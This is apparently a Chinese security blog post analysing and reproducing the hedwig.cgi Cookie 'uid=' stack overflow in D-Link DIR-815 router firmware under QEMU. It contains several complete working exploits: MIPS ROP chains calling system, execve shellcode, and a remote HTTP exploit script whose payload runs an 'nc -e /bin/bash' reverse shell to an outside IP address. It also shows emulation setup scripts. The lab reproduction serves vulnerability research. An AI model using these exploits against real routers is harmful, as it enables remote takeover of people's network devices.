---
title: D-Link DIR-815路由器溢出漏洞分析
top: 101
tags: MIPS架构
categories: IOT安全
abbrlink: d1f081a9
---

网上关于 `D-Link DIR-815` 路由器漏洞复现的文章还是蛮多的，因此第一次的复现选择了这个软柿子🤔。因为网上复现这个漏洞的文章已经很多了，所以我尽可能来写一些大多文章没有提到的点。

>**DIR-815 固件中的 Hedwig.cgi 脚本中，在处理 HTTP 头时，如果 Cookie 字段中含 uid= 的值则存在栈溢出漏洞，从而获得路由器远程控制权限**
>
>**影响版本 ：DIR-815/300/600/645等**

### 运行时报错

![image-20230518172151330](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181721376.png)

这个报错说明找不到 `libgcc_s.so.1` 文件，解决方法是将解压固件得到的文件系统中的 `/lib` 目录下的 `libgcc_s.so.1` 文件软链接到 `/lib` 目录下即可

![image-20230519095103004](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305190951158.png)



然后再次运行发现并不是原本缺少 `libgcc_s.so.1` 的报错了（如下）

![image-20230518165839841](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181658971.png)

看到这个字符串会感觉有点熟悉，发现是程序里没有匹配到相应的函数（如下），因为运行的 `cgibin` 程序并不在这个匹配的列表中，正常情况下都是通过软链接指向的这个程序来执行的。所以要去执行 `hedwig.cgi` 程序

![image-20230518165917093](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181659144.png)

因为当初 `binwalk` 提取完固件，其中 `hedwig.cgi` 的软链接都指向了 `/dev/null` ，所以这里要把 `hedwig.cgi` 删掉，重新生成一个 `cgibin` 的软链接。

下图程序是成功跑起来了

![image-20230518171306696](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181713829.png)

### 分析二进制文件

#### main

`main` 函数的最开始在匹配程序名以来调用不同的函数来实现具体功能。

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305180744182.png" alt="image-20230518074412983" style="zoom:50%;" />

```c
  v3 = *argv;
  v6 = strrchr(*argv, '/');
  if ( v6 )
    v3 = v6 + 1;
  if ( !strcmp(v3, "phpcgi") )
  {
    v8 = (void (__noreturn *)())phpcgi_main;
    v9 = argc;
    return ((int (__fastcall *)(int, const char **, const char **))v8)(v9, argv, envp);
  }
```

以这段代码为例，首先根据 `*argv` 获取程序的名字，通过 `strrchr` 函数来匹配程序名中最后一个 `/` 出现的位置， `v6+1` 取的是 `/` 的下一个字符的地址，然后来匹配是否为 `phpcgi` 这个字符串， 如果是的话则跳转到 `phpcgi_main` 函数，整个 `main` 函数都是在做这个事情



#### hedwigcgi_main

接下来逐步分析 `hedwigcgi_main` 函数

`sprintf` 是危险函数，将字符串格式化后拷贝到指定内存时没有规定长度大小从而可能存在溢出

这里需要让环境变量 `REQUEST_METHOD` 为 `POST` ，并且创建 `/var/tmp/temp.xml` 文件

![image-20230521085117376](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210851749.png)

上图中出现的一个关键函数是 `sess_get_uid` ，它的作用是将提取的 `COOKIE` 中 `uid=` 后面的字符串存为 `v4` 的 `data` 字段。下面来分析一下这个函数

##### sess_get_uid

在分析这个函数之前，还需要分析前面出现过的几个函数 `sobj_new` `sobj_strcmp` `sobj_add_char`  `sobj_get_string` 

##### sobj_new

申请了一块堆，用来存储结构体的数据，主要关注的是 `max_len`  `used_len` `data` 这三个成员，其他几个之后逆向分析的时候没用到（这里每个字段的含义，不是一上来就知道的，这是分析其他函数时进行猜测的）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181102504.png" alt="image-20230518110253441" style="zoom:50%;" />

##### sobj_strcmp

传入的参数一个是 `sobj_new` 返回的结构体指针，另一个是字符串指针，判断结构体的 `data` 字段存储的字符串是否和传入的字符串一样

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181117507.png" alt="image-20230518111747463" style="zoom:50%;" />

##### sobj_add_char

传入了 `sobj_new` 返回的结构体指针，另一个参数是字符。首先判断结构体指针是否存在，`max_len` 是否等于 `used_len` 。如果符合条件的话将字符 `ch` 写入到 `data` 字段中，并且让 `used_len` 字段加一。

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181126711.png" alt="image-20230518112641661" style="zoom:50%;" />



##### sobj_get_string

该函数用于返回传入的结构体指针中 `data` 域的指针

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181132195.png" alt="image-20230518113206147" style="zoom:50%;" />



现在来分析 `sess_get_uid` 

函数最开始进行了一些初始化和判断，同时拿到了环境变量 `HTTP_COOKIE` 值的指针，并设置   `state` （ 状态位）为 `0`

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181110826.png" alt="image-20230518111058786" style="zoom:50%;" />

该函数具体功能是通过逐个扫描 `COOKIE` 的字符，来寻找 `=` ，如果找到了 `=` 则设置 `state` 为 `2` ，之后再扫描字符的时候因为 `state` 为 `2` 的缘故，都会进入另一个分支，去将扫描 `COOKIE` 的字符存储到 `v4` 结构体的 `data` 成员中。如果没有找到 `=` 那么 `state` 一直为 `1` ，则始终将 `COOKIE` 的字符存储到 `v2` 结构体的 `data` 成员中（如下图）

当扫描完 `COOKIE` 的所有字符后，去判断 `v2` 结构体的 `data` 成员是否为字符串 `uid` ，如果是的话，就将 `v4` 结构体之前存储的字符串写到结构体 `a1` 的 `data` 域中。（ `a1` 也就是 `sess_get_uid` 函数传入的结构体指针）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210943265.png" alt="image-20230521094300133" style="zoom: 67%;" />



再回到 `hedwigcgi_main` 函数上，现在想执行到真正利用的溢出点，需要控制 `haystack` 的值才行（如下图）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210954878.png" alt="image-20230521095402701" style="zoom:50%;" /> 



#### 控制 `haystack`

通过查看 `haystack` 的交叉引用（如下图），发现只有一个地方可以对 `haystack` 进行赋值

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210959344.png" alt="image-20230521095927264" style="zoom:67%;" />



跳转过去到了 `409A6C` 函数

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211000998.png" alt="image-20230521100001952" style="zoom:50%;" />

如果记性不错的话应该能想起来它是一个回调函数，在 `hedwigcgi_main` 函数中出现过 `cgibin_parse_request((int)sub_409A6C, 0, 0x20000u);` 因此就要去分析 `cgibin_parse_request` 函数，看看是何时调用了 `409A6C` 函数



##### cgibin_parse_request

这里是 `cgibin_parse_request` 函数的后部分，前部分要满足 `CONTENT_LENGTH < 0x20000` 和 `REQUEST_URI` 这个值要存在，这样才能走到下面这部分

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211014282.png" alt="image-20230521101434200" style="zoom: 67%;" />

这里设置 `CONTENT_TYPE` 为 `aApplication` ，最后会调用 `0x42C014[2]` 位置的指针，该函数指针就是 `0x403B10`

![image-20230521105041949](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211050021.png)



之后给个分析的思路吧， 实在不想写这么详细了。

进入 `403B10` 函数，首先 `CONTENT_TYPE` 在原本的 `aApplication` 后面要再加上字符串 `x-www-form-urlencoded` 才能进入主逻辑部分。 `read` 会读入 `0xc` 个数据，然后将这个输入的数据作为参数调用 `402B40` 函数，这个函数将刚刚读入的数据，以 `=` 进行分割。接着调用了函数指针 `v9` （这个 `v9` 就是最开始所说的回调函数 `409A6C` ），而刚刚 `=` 前面的数据会被当做参数传进来，下面再看一下 `409A6c` 函数

![image-20230521110226484](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211102535.png)

因此只要走到这里，`haystack` 就会被赋值成 `=` 前面字符串的地址。从而绕过 `if ( !haystack )` 这个判断。

总结一下赋值 `haystack` 的函数调用链 ：`cgibin_parse_requeset -> 403b10 -> 402b40 -> 函数指针v9` ，初学者可以自行去详细分析上述过程。



### `qemu` 用户模式下复现

#### `ROP` 链的布置

现在是肯定能走到第二次的 `sprintf` 进行溢出了。现在我们来测一下溢出控制返回地址的偏移量是多少。

##### 如何调试

先准备一个 `payload` 文件，里面放入 `COOKIE` 的值，这里直接用 `cyclic 2000 > payload` ，不过别忘记在最开始加一个 `uid=` 字符串

然后写一个启动脚本（如下），这里简单说明一下这个脚本。首先使用 `chroot` 命令将当前目录 `squashfs-root` 设置为根目录，因为程序打开的文件都是相对于这个文件系统来说的。一旦将 `squashfs-root` 设置为根目录，那么 `qemu-mipsel`  就没办法使用了，因为依赖了其他目录的库文件，因此我们使用静态链接的 `qemu-mipsel-static` （我的 `ubuntu 18.04` 上用 `apt-get install` 安装的 `qemu-mipsel-static` 会报一个错误

![image-20230521151058316](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211510370.png)

原因是这个 `qemu-mipsel-static` 版本太低，我的解决方法是在 `ubuntu 22.04` 上安装后，拖到了 `18.04` 上）  

`-E` 用于指定要在模拟的虚拟机中设置的环境变量，而这些变量是前面分析过的，进行设置即可,剩下的就和调试 `MIPS` 架构的程序一样了，有需要的话可以查看这篇 [文章](https://zikh26.github.io/posts/919c29c4.html#%E7%9B%B4%E6%8E%A5%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F)

```shell
#!/bin/bash
payload=$(echo "$(cat payload)")
sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=666 -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$payload -E REQUEST_URL="zikh26"  -g 1234 /htdocs/web/hedwig.cgi 
```



![image-20230521114724909](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211147020.png)

发现覆盖到返回地址需要填充 `1043` 的垃圾数据。

通过观察函数最后返回处的汇编，这里是可以控制很多寄存器，我们接下来就是要通过这些可控的寄存器来完成 `ROP`

![image-20230521114847280](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211148333.png)



##### ROP-system

因为这个程序的溢出是 `sprintf` 导致的， `\x00` 可以造成字符串的截断，而 `system` 函数地址末尾就是 `\x00` ，为了避免被截断，我们要先让 `system` 函数的地址减一放入一个寄存器，之后跳转到能让这个寄存器加一的 `gadget` 上。`MIPS` 架构的 `ROP` 是通过寄存器间的跳转实现的，而 `x86` 中通常是用 `ret` 指令根据栈中存放的数据来跳转的。

在 《揭秘家用路由器0day漏洞挖掘技术》一书中对该 `ROP`  链布局画的十分形象（如下），因为上面提到了我们能控制很多寄存器，就先在 `$ra` 寄存器布置一个让 `$s0` 加一的 `gadget` （提前控制 `$s0` 为 `system` 减一的地址），接着跳转到一段能赋值栈地址的 `gadget` 上（用于指向 `/bin/sh` ），最后跳回到 `system` 上

![image-20230521144117106](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211441230.png)

补充：

1. 程序依赖的 `libc` 是软链接 `libc.so.0` 指向的 `libuClibc-0.9.30.1.so` ，因此 `gadget` 要去这个里面找
2. 找 `gadget` 的话，用 `IDA` 插件 `mipsrop` 。以上面两段 `gadget` 为例，搜寄存器加一的指令可以这么搜 `mipsrop.find("addiu .*,1")` ，当然了可能会出现下面的报错

![image-20230521145755628](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211457716.png)

只需要点一下 `search -> mips rop gadgets`  即可

![image-20230521145839462](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211458582.png)

能匹配到很多个 `gadget` （如下），根据自己布局的需求来选择合适的就可以

![image-20230521150004230](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211500301.png)

如果要搜将栈地址放入某个寄存器的 `gadget` ，可以用 `mipsrop.stackfinder()` 命令（如下）

![image-20230521150247898](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211502965.png)



[winmt](https://bbs.kanxue.com/thread-272318.htm) 师傅提到 用户模式不支持多线程，而 `system` 函数会调用 `fork` 函数，从而导致 `fork` 执行失败，`system` 执行到这里后就会卡住。不过之后在系统模式下是没问题的

###### EXP

```python
from pwn import *
context(arch='mips', os='linux', endian='little', word_size=32,log_level='debug')
libc_base=0x3ff38000

#0x4E0EC => move $a0,$s1 ; jalr $s0
#0x42f60 => addiu $a0,$sp,0x18 ;  jalr  $a0 
#0x4683C => move $a0,$s1  ;  jalr  $s3
#0xB814  => addiu $a1,$sp,0x18  ;  jalr  $s1 
#0xDEF0  => addiu $s2,$sp,0x10 ;  jalr  $s4 
#0x3F25C => jalr $s2
#0x158c8 => adddiu $s0,1  ; jalr $s5
#0x159cc => addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0

sys_addr=libc_base+0x53200
payload=b"uid="+b'c'*1007

payload+=p32(sys_addr-1)
payload+=b'b'*0x10
payload+=p32(libc_base+0x159cc)
payload+=b'c'*0xc
payload+=p32(libc_base+0x158c8)
payload+=p32(0xdeadbeef)*4
payload+=b"/bin//sh"

with open("payload",'wb') as f:
    f.write(payload)
f.close()
```

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211521976.png" alt="image-20230521152152411" style="zoom:50%;" />

上面的 `exp` 是可以正常走到 `system` 函数的，但是 `a0` 是 `/bin//sh/postxml` ，这是因为第一次 `sprintf` 拼接了后面的字符串常量 `postxml` 。因为地址固定的原因，我们可以直接使用 `libc` 中的 `/bin/sh` 地址 EXP如下

```py
from pwn import *
context(arch='mips', os='linux', endian='little', word_size=32,log_level='debug')

libc_base=0x3ff38000
sys_addr=libc_base+0x53200
bin_sh_addr=libc_base+0x5a448
payload=b"uid="+b'c'*1007

#0x4E0EC => move $a0,$s1 ; jalr $s0
#0x42f60 => addiu $a0,$sp,0x18 ;  jalr  $a0 
#0x4683C => move $a0,$s1  ;  jalr  $s3
#0xB814  => addiu $a1,$sp,0x18  ;  jalr  $s1 
#0xDEF0  => addiu $s2,$sp,0x10 ;  jalr  $s4 
#0x3F25C => jalr $s2
#0x158c8 => adddiu $s0,1  ; jalr $s5
#0x159cc => addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0

payload+=p32(sys_addr-1)#$s0
payload+=p32(bin_sh_addr)#$s1
payload+=b'b'*0xc
payload+=p32(libc_base+0x4e0ec)#$s5
payload+=b'c'*0xc
payload+=p32(libc_base+0x158c8)#$ra
payload+=p32(0xdeadbeef)*4
payload+=b"/bin/sh;deadbeef;"

with open("payload",'wb') as f:
    f.write(payload)
f.close()

```

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211526368.png" alt="image-20230521152651843" style="zoom: 50%;" />

可以发现这次是成功执行到了 `system("/bin/sh")` ，因为 `fork` 的原因，依然是拿不到 `shell`



##### ROP-ret2shellcode

明白了上面 `ROP` 的思想，那么布置 `shellcode` 也就不在话下，因为 `shellcode` 能直接调用 `execve` 从而不需要去使用 `fork`。不过需要注意的是 `shellcode` 中不能出现 `\x00` 还有缓存不一致性（数据缓存区和指令缓存区需要一个时间来同步），因此需要先调用一下 `sleep(1)` 再去执行 `shellcode`。

这里还需要提到一点，如果现在执行了 `gadgetA` ，然后跳转到了 `sleep(1)` 函数，等函数返回时会再跳转到了 `gadgetA`，因此必须要保证 `gadgetA` 回来后依然能去跳转到我们指定的地址，依次来保证 `ROP` 不间断。

画了个抽象的图（如下）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211548681.png" alt="image-20230521154829529" style="zoom:50%;" />

###### EXP

```py
from pwn import *
context(arch='mips', os='linux', endian='little', word_size=32,log_level='debug')
libc_base=0x3ff38000
sys_addr=libc_base+0x53200
bin_sh_addr=libc_base+0x5a448
sleep=libc_base+0x56bd0
payload=b"uid="+b'c'*(1007)

#0x4E0EC => move $a0,$s1 ; jalr $s0
#0x42f60 => addiu $a0,$sp,0x18 ;  jalr  $a0 
#0x4683C => move $a0,$s1  ;  jalr  $s3

#0xB814  => addiu $a1,$sp,0x18  ;  jalr  $s1 
#-------------------------
#0xDEF0  => addiu $s2,$sp,0x10 ;  jalr  $s4 
#0x436D0 => move $t9,$s3 ; jalr $t9
#0x3F25C => jalr $s2
#0x57E50 => li $a0,1 ;  jalr  $s1 
#-------------------------
#0x158c8 => adddiu $s0,1  ; jalr $s5
#0x159cc => addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0
shellcode = asm('''
    slti $a2, $zero, -1
    li $t7, 0x69622f2f
    sw $t7, -12($sp)
    li $t6, 0x68732f6e
    sw $t6, -8($sp)
    sw $zero, -4($sp)
    la $a0, -12($sp)
    slti $a1, $zero, -1
    li $v0, 4011
    syscall 0x40404
        ''')
payload+=p32(0xdeadbeef)#$s0
payload+=p32(libc_base+0x436d0)#$s1
payload+=p32(0xdeadbeef)#$s2
payload+=p32(sleep)#$s3
payload+=p32(libc_base+0x3f25c)#$s4
payload+=p32(0xdeadbeef)#$s5
payload+=b'c'*0xc
payload+=p32(libc_base+0x57e50)#$ra
payload+=p32(0xdeadbeef)*10
payload+=p32(libc_base+0x3f25c)#$s4
payload+=p32(libc_base+0xdef0)#second return address $ra
payload+=p32(0xdeadbeef)*4
payload+=shellcode

with open("payload",'wb') as f:
    f.write(payload)
f.close()
```

![image-20230521161702923](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211617086.png)

可以看到这次是拿到 `shell` 了。不过这里执行 `execve("/bin/sh")` 成功其实是一种假象，因为固件中的 `/bin/sh` 链接到了 `busybox` 上，虽然 `busybox` 是静态链接，但因为它是 `MIPS` 架构，导致了直接执行是失败的。因此我上面是把原本的 `sh` 给删掉，换成了主机自带的 `x86_64` 架构的 `sh` ，同时还把相应的动态库都放到了当前的 `/lib` 下面，才算执行成功。不然用原本的 `sh` 还是执行失败，这么做的目的仅仅是为了证明这种操作理论上是可以拿到 `shell` 的 😎



### `qemu` 系统模式下复现

只要在 `qemu` 用户模式下能复现成功，并且搞清楚原理，其实这个 `qemu` 系统模式搞的很快。就先实现一下 `qemu` 与宿主机的通信，然后把 `httpd` 服务启起来就可以发送数据包直接打了（在不遇到什么奇奇怪怪的报错下）

我这里的环境是 `ubuntu 18.04` `qemu-system-mipsel 7.2.0` 



#### 实现宿主机与 `qemu` 的通信

创建一个 `net.sh` 脚本，我这里的网卡是 `ens33` ，如果是 `eth0`  的话，就把出现的 `ens33` 换成 `eth0` 即可，`chmod +x net.sh` 给文件可执行权限，然后 `./net.sh` 运行

```shell
#!/bin/sh
#sudo ifconfig eth0 down                 # 首先关闭宿主机网卡接口
sudo brctl addbr br0                     # 添加一座名为 br0 的网桥
sudo brctl addif br0 ens33                # 在 br0 中添加一个接口
sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议
sudo brctl setfd br0 1                   # 设置 br0 的转发延迟
sudo brctl sethello br0 1                # 设置 br0 的 hello 时间
sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口
sudo ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口
sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址
sudo brctl show br0                      # 查看虚拟网桥列表
sudo brctl showstp br0                   # 查看 br0 的各接口信息
```



然后再执行如下几条命令

```shell
#!/bin/sh
sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问
sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口
sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口
sudo brctl showstp br0
```



再用下面这个脚本启动

```shell
sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no
```

这个 `mips` 内核还有镜像文件，之前师傅们上放的链接好像都失效了。这里是找 **winmt** 师傅要的一份，上传到网盘上了  链接：https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v 
提取码：l04v





如果此时 `qemu` 中的网卡 `eth0` 是有 `ip` 的，并且能够 `ping` 通宿主机的 `ip`，那就能说明 `qemu` 已经能和宿主机进行通信了

![image-20230521233355276](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305212333766.png)

![image-20230521233441258](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305212334427.png)



#### 启动 `httpd` 服务

在 `squashfs-root` 的上一级目录中，执行下面的命令， `IP` 换成 `qemu` 的。这样可以实现计算机远程之间的文件传输，作用就是把提取出来的文件系统传到 `qemu` 里面

`sudo  scp -r ./squashfs-root root@10.214.140.139:/root/squashfs-root`



然后在 `qemu` 中的 `squashfs-root` 目录下新建一个 `http_conf` 文件

写入以下代码（网卡和 `IP` `port` 要改成自己的）

```
Umask 026
PIDFile /var/run/httpd.pid
LogGMT On  #开启log
ErrorLog /log #log文件

Tuning
{
    NumConnections 15
    BufSize 12288
    InputBufSize 4096
    ScriptBufSize 4096
    NumHeaders 100
    Timeout 60
    ScriptTimeout 60
}

Control
{
    Types
    {
        text/html    { html htm }
        text/xml    { xml }
        text/plain    { txt }
        image/gif    { gif }
        image/jpeg    { jpg }
        text/css    { css }
        application/octet-stream { * }
    }
    Specials
    {
        Dump        { /dump }
        CGI            { cgi }
        Imagemap    { map }
        Redirect    { url }
    }
    External
    {
        /usr/sbin/phpcgi { php }
    }
}


Server
{
    ServerName "Linux, HTTP/1.1, "
    ServerId "1234"
    Family inet
    Interface eth0  #对应qemu仿真路由器系统的网卡
    Address 10.214.140.139 #qemu仿真路由器系统的IP
    Port "80" #对应未被使用的端口
    Virtual
    {
        AnyHost
        Control
        {
            Alias /
            Location /htdocs/web
            IndexNames { index.php }
            External
            {
                /usr/sbin/phpcgi { router_info.xml }
                /usr/sbin/phpcgi { post_login.xml }
            }
        }
        Control
        {
            Alias /HNAP1
            Location /htdocs/HNAP1
            External
            {
                /usr/sbin/hnap { hnap }
            }
            IndexNames { index.hnap }
        }
    }
}

```



然后在物理机上 `/opt/tools/mipsel` 目录（没有的话就自己创建吧）中新建 `init.sh` 文件，写入如下配置

```shell
#! /bin/sh
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

给这个 `init.sh` ，可执行权限，然后将其执行



然后在 `qemu` 中的 `squashfs-root` 目录下创建 `init.sh` 文件，写入下面的内容。给可执行权限，然后执行

```shell
#!/bin/bash
echo 0 > /proc/sys/kernel/randomize_va_space
cp http_conf /
cp sbin/httpd /
cp -rf htdocs/ /
mkdir /etc_bak
cp -r /etc /etc_bak
rm /etc/services
cp -rf etc/ /
cp lib/ld-uClibc-0.9.30.1.so  /lib/
cp lib/libcrypt-0.9.30.1.so  /lib/
cp lib/libc.so.0  /lib/
cp lib/libgcc_s.so.1  /lib/
cp lib/ld-uClibc.so.0  /lib/
cp lib/libcrypt.so.0  /lib/
cp lib/libgcc_s.so  /lib/
cp lib/libuClibc-0.9.30.1.so  /lib/
cd /
rm -rf /htdocs/web/hedwig.cgi
rm -rf /usr/sbin/phpcgi
rm -rf /usr/sbin/hnap
ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi
ln -s /htdocs/cgibin /usr/sbin/phpcgi
ln -s  /htdocs/cgibin /usr/sbin/hnap
./httpd -f http_conf
```



最后进到 `/squashfs-root/sbin` 目录下，执行 `./httpd -f /root/squashfs-root/http_conf`

在宿主机中访问 `http://10.214.140.139/hedwig.cgi` 发现可以正常访问了（如下）

![image-20230522092237155](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305220922344.png)





开启 `httpd` 服务后，如果要进行调试则需要下载一个 [gdbserver.mipsle](https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver) ，然后再用 `scp` 命令将其上传到 `qemu` 中的 `/root/squashfs-root/` 目录下。

在 `qemu` 中 `/root/squashfs-root/` 目录下新建 `run.sh` 脚本（`IP` 改成宿主机的，端口）

```shell
#!/bin/bash
export CONTENT_LENGTH="11"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE="uid=`cat payload`"
export REQUEST_METHOD="POST"
export REQUEST_URI="2333"
echo "winmt=pwner"|./gdbserver.mipsle 10.214.140.140:7788 /htdocs/web/hedwig.cgi
#echo "winmt=pwner"|/htdocs/web/hedwig.cgi
unset CONTENT_LENGTH
unset CONTENT_TYPE
unset HTTP_COOKIE
unset REQUEST_METHOD
unset REQUEST_URI
```

正常情况下应该是能从宿主机中调试 `qemu` 中的程序，但我这里报了这个错误。

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221824553.png" alt="image-20230522182439980" style="zoom:50%;" />



不过还有一个方法也能确定 `libc` 基地址，就是用运行 `hedwig.cgi` 后进行后台挂起，然后用 `cat /proc/pid/maps` 查看，先跑几次程序，发现 `pid` 的增长是有规律的，于是提前预测一下，多尝试几次就能打印出来内存布局获取 `libc` 基地址（如下）

![image-20230522154245358](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221542829.png)

因为没法调试，这里就直接用网上师傅的脚本打了（主要用户模式已经写了好几种脚本，这个没法调试的问题死活解决不了），思路和用户模式 `ROP-system` 的那个脚本是一样的，就把命令换成反弹 `shell` 的命令即可

#### EXP

```py
#!/usr/bin/python3
from pwn import *
context.endian = "little"
context.arch = "mips"

import requests
import sys
def get_payload(offset, libc_base, cmd):
    Calcsystem = 0x158c8    # $s0 add 1, jalr $s5
    Callsystem = 0x159cc    # '/bin/sh' -> $a0, jalr system
    system_addr_1 = 0x53200 - 1
    payload = b'A' * offset  # 973
    payload += p32(libc_base + system_addr_1)  # s0     977
    payload += b'A' * 4                        # s1     981
    payload += b'A' * 4                        # s2     985
    payload += b'A' * 4                        # s3     989
    payload += b'A' * 4                        # s4     993
    payload += p32(libc_base + Callsystem)     # s5     997
    payload += b'A' * 4                        # s6     1001
    payload += b'A' * 4                        # s7     1005
    payload += b'A' * 4                        # fp     1009
    payload += p32(libc_base + Calcsystem)     # ra
    payload += b'B' * 0x10
    payload += cmd
    return payload

if __name__ == "__main__":
    cmd = b"nc -e /bin/bash 10.214.140.144 7788"
    cookie = b'uid=' + get_payload(973, 0x2aaf8000, cmd)
    header = {
        'Cookie': cookie,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '100'
    }
    data = {'x': 'x'}
    ip_port = sys.argv[1]
    url = "http://" + ip_port + "/hedwig.cgi"
    r = requests.post(url=url, headers=header, data=data)
    print(r.text)
```

可以看到是已经将 `qemu` 中模拟的环境 `shell` 反弹到了宿主机上。

![image-20230522160633923](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221606264.png)





### 参考文章

[原创\] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-272318.htm)

[DLink 815路由器栈溢出漏洞分析与复现 - unr4v31 - 博客园 (cnblogs.com)](https://www.cnblogs.com/unr4v31/p/16072562.html)

[(47条消息) 从零到一：复现 DIR-815 栈溢出漏洞_Y6blNU1L的博客-CSDN博客](https://blog.csdn.net/qq_44223394/article/details/128756188)

[(47条消息) qemu与宿主机网络通信配置_ubuntu主机和qemu网络互通_HZero.chen的博客-CSDN博客](https://blog.csdn.net/jasonactions/article/details/118931633)